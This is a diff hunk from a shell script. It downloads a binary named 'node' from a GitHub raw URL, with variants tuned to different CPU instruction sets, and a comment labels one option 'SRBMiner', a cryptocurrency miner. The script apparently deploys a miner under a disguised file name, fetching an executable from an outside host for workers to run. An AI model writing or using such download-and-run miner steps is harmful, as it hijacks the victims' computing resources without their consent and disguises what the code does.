@@ -3,7 +3,15 @@ WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 
 # opt
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx2/node
 curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/avx512-sha-vaes/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/ryzen/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse2/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse2amd/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse42/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/opt/sse42-aes/node
+
 # SRBMiner
 #curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 
